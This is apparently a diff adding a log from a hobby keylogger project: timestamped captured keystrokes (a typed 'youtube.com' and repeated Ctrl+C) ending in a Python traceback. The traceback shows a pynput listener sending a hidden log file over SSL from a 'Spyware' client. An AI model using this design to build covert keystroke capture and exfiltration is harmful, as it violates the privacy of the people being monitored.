@@ -1,0 +1,43 @@
+2024-02-09 20:12:26,720 - 'y'
+2024-02-09 20:12:26,849 - 'o'
+2024-02-09 20:12:27,056 - 'u'
+2024-02-09 20:12:27,164 - 't'
+2024-02-09 20:12:27,273 - 'u'
+2024-02-09 20:12:27,450 - 'b'
+2024-02-09 20:12:27,554 - 'e'
+2024-02-09 20:12:28,223 - Key.shift
+2024-02-09 20:12:28,313 - '.'
+2024-02-09 20:12:28,470 - 'c'
+2024-02-09 20:12:28,554 - 'o'
+2024-02-09 20:12:28,729 - 'm'
+2024-02-09 20:12:29,123 - Key.enter
+2024-02-09 20:12:44,034 - Key.ctrl_l
+2024-02-09 20:12:44,199 - '\x03'
+2024-02-09 20:12:44,432 - '\x03'
+2024-02-09 20:12:44,648 - '\x03'
+2024-02-09 20:12:44,874 - '\x03'
+2024-02-09 20:12:45,228 - '\x1a'
+2024-02-09 20:12:45,716 - '\x03'
+2024-02-09 20:12:47,402 - Key.ctrl_l
+2024-02-09 20:12:47,516 - '\x03'
+2024-02-09 20:12:47,734 - '\x03'
+2024-02-09 20:12:48,836 - 'c'
+2024-02-09 20:12:48,908 - 'l'
+2024-02-09 20:12:48,909 - Unhandled exception in listener callback
+Traceback (most recent call last):
+  File "C:\Users\rrais\AppData\Local\Programs\Python\Python311\Lib\site-packages\pynput\_util\__init__.py", line 228, in inner
+    return f(self, *args, **kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\rrais\AppData\Local\Programs\Python\Python311\Lib\site-packages\pynput\keyboard\_win32.py", line 287, in _process
+    self.on_press(key)
+  File "C:\Users\rrais\AppData\Local\Programs\Python\Python311\Lib\site-packages\pynput\_util\__init__.py", line 144, in inner
+    if f(*args) is False:
+       ^^^^^^^^
+  File "C:\Users\rrais\Desktop\Dev\Python_Scripting\Spyware\client\client.py", line 45, in on_press
+    send_file_content(client_ssl, path_hidden_file)
+  File "C:\Users\rrais\Desktop\Dev\Python_Scripting\Spyware\client\client.py", line 36, in send_file_content
+    client_ssl.send(file_content.encode())
+  File "C:\Users\rrais\AppData\Local\Programs\Python\Python311\Lib\ssl.py", line 1243, in send
+    return self._sslobj.write(data)
+           ^^^^^^^^^^^^^^^^^^^^^^^^
+ssl.SSLEOFError: EOF occurred in violation of protocol (_ssl.c:2427)
